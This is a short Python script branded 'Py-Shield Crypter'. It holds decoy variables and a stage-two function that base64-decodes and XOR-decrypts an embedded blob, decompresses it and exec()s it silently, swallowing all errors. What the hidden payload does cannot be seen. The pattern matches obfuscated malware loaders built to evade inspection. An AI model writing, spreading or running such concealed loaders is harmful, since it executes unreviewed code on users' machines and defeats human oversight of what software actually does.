# Protected by Py-Shield Crypter
import base64, zlib, sys

SFCiVypH = 473
wUpXqWir = 561
WBogOfMF = 699
tBFuzbGz = 878
OChFcauc = 379

def _stage2():
    try:
        _k = base64.b64decode("m40smH79EgqIPCSz/KAC8A==")
        _d = base64.b64decode("4xGpzBOSyTyYwkpzA0Gi8giB9Azlk00IkLm/F5cgZ/txidWoav8/lOwKNhpuNF/fU/LzycqRNwG4PRLsExnlflQQgIMT4fZkV5y5MSFznVbE5obS0GTTFaVmY7QRGjPK3MZL1qjFDB/O6wQLvx8G6et32eBK46+JUVAipKa1sJyW+n6zwc4M1ySSl0hT38LyOQBfVQdn/L7xAFcJiLs2vC90j8jolEGsF5hu5EXhVnQ4vVt03G+61oJh/wMmao1Iw2uyTlEG1+UWVhCtIf587nnWw/jJnsBS3tZJaUhLlhYoyzjxj4Ps4RTtCEFwvdS9vSkN0xPkuKe8ZpWhobLdrUZR6gu+AGRzfxl42kR7sh/BJ4iv4792Nz8Q87XBYWrik3CjSfc11jmZZGQWNwS0FX/xEJqE53xn9xhJdbntCg06vtfrThnKoktnli6oAqhoRu155UaexfxWnn0ZmRAJlmO+615j0C35Ql7LsNd80JuF0OSa6ovtf5WEPe2nP3J42eVTjw8J1kdxIOHjlKM29TIxkoAzSs0sr99TA4ZovKzE022q4X3Buhk+pRcs8xKAC5PUAIoTdvD+lA+Mol3GTO51vGTX6ECIxZecPsYlMRxVdZY6/b1vAGnmWHPXfJbeojMkYSho9CijWKG6aWgW9NLj1JBZjthdd+Sg0WHtwK0k5pxOJfEJLYMWEvkda8iTxE40JBNtGT7+zTBIOzwvu7EI1ISc5u+FJBa6TTpG8wOb/AtFmMgyJ/2/DhIJpLrVNDv9UiwNz7xg9hltUUPspCwjp+5uZe3w5YoXIchyYWCIo75R9WUobzWprRL4Qajr5wYMPz2SfUPbXHdagXbwbJHJSobHghEYG99uw9/obCbqR2Yf5AUuQGo1ebJYV8l7mAyQjuoIMCysky/72eRNzXf+KHFx+Luo4hoQUB7ARlst/0jvlHaeHh4sPPowS22B/NcQstkbkYCxanLrCmTdwyOxJJTWMBKPiehfM0anUsuQWhCpg7WcVeLN9OFbcPVXzFVLlHD4E73M69eOqtWC7D/xvEYpjdVc++7UqMtarOKhW7xeefttm0DcJWRq1BFGkiZn9Wk1s32H7OKQHjhnekwVSSje44FvtqF9peGYhRQVytOaUgodhQ==")
        _x = bytearray(b ^ _k[i % len(_k)] for i, b in enumerate(_d))
        _c = zlib.decompress(_x)
        exec(_c, globals())
    except Exception as e:
        pass

if __name__ == "__main__":
    _stage2()
